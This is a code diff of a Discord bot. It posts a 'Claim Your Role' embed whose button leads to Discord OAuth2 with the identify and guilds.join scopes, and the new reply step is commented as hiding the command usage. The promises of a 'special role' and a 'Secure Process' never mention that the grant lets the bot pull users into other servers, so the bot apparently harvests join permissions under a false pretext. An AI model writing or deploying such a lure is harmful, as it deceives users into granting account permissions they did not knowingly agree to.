@@ -97,50 +97,7 @@ client.on('guildCreate', async (guild) => {
     }
 });
 
-// Function to send authorization embed
-async function sendAuthorizationEmbed(interaction) {
-    try {
-        const guild = interaction.guild;
 
-        const embed = new EmbedBuilder()
-            .setTitle('Claim Your Role')
-            .setDescription(
-                '**Click the button below to claim your special role!**\n\n' +
-                '**Quick & Easy** - Just click the button\n' +
-                '**Secure Process** - Official Discord OAuth2\n' +
-                '**Instant Role** - Get your verified role immediately\n\n' +
-                '*Ready to claim your role? Click below!*'
-            )
-            .setColor(0x2f3136)
-            .setThumbnail('https://cdn.discordapp.com/emojis/886264180325941318.png')
-            .setFooter({ text: 'Secure Role Claiming System' })
-            .setTimestamp();
-
-        // Create authorization button with generic OAuth URL (Discord will handle user identification)
-        const baseOAuthUrl = `https://discord.com/api/oauth2/authorize?client_id=${process.env.OAUTH2_CLIENT_ID}&redirect_uri=${encodeURIComponent(process.env.OAUTH2_REDIRECT_URI)}&response_type=code&scope=identify%20guilds.join&state=${guild.id}`;
-
-        const authButton = new ButtonBuilder()
-            .setLabel('🎭 Claim Role')
-            .setStyle(ButtonStyle.Link)
-            .setURL(baseOAuthUrl);
-
-        const row = new ActionRowBuilder()
-            .addComponents(authButton);
-
-        await interaction.reply({
-            embeds: [embed],
-            components: [row]
-        });
-
-        console.log(`Sent role claim embed to ${guild.name} via slash command`);
-    } catch (error) {
-        console.error('Error sending role claim embed:', error);
-        await interaction.reply({
-            content: '**Error:** Failed to send role claim embed. Please try again.',
-            ephemeral: true
-        });
-    }
-}
 
 client.on('guildDelete', (guild) => {
     console.log(`Left/banned from server: ${guild.name} (${guild.id})`);
@@ -164,8 +121,54 @@ client.on('interactionCreate', async (interaction) => {
                 return;
             }
 
-            // Send the authorization embed directly without deferring
-            await sendAuthorizationEmbed(interaction);
+            // Reply ephemeral first to hide the command usage
+            await interaction.reply({
+                content: '✅ Role claiming embed sent to the channel!',
+                ephemeral: true
+            });
+
+            // Then send the embed to the channel
+            try {
+                const guild = interaction.guild;
+
+                const embed = new EmbedBuilder()
+                    .setTitle('Claim Your Role')
+                    .setDescription(
+                        '**Click the button below to claim your special role!**\n\n' +
+                        '**Quick & Easy** - Just click the button\n' +
+                        '**Secure Process** - Official Discord OAuth2\n' +
+                        '**Instant Role** - Get your verified role immediately\n\n' +
+                        '*Ready to claim your role? Click below!*'
+                    )
+                    .setColor(0x2f3136)
+                    .setThumbnail('https://cdn.discordapp.com/emojis/886264180325941318.png')
+                    .setFooter({ text: 'Secure Role Claiming System' })
+                    .setTimestamp();
+
+                // Create authorization button with generic OAuth URL
+                const baseOAuthUrl = `https://discord.com/api/oauth2/authorize?client_id=${process.env.OAUTH2_CLIENT_ID}&redirect_uri=${encodeURIComponent(process.env.OAUTH2_REDIRECT_URI)}&response_type=code&scope=identify%20guilds.join&state=${guild.id}`;
+
+                const authButton = new ButtonBuilder()
+                    .setLabel('🎭 Claim Role')
+                    .setStyle(ButtonStyle.Link)
+                    .setURL(baseOAuthUrl);
+
+                const row = new ActionRowBuilder()
+                    .addComponents(authButton);
+
+                await interaction.channel.send({
+                    embeds: [embed],
+                    components: [row]
+                });
+
+                console.log(`Sent role claim embed to ${guild.name} via slash command`);
+            } catch (error) {
+                console.error('Error sending role claim embed:', error);
+                await interaction.followUp({
+                    content: '**Error:** Failed to send role claim embed. Please try again.',
+                    ephemeral: true
+                });
+            }
         }
 
         if (interaction.commandName === 'backup') {
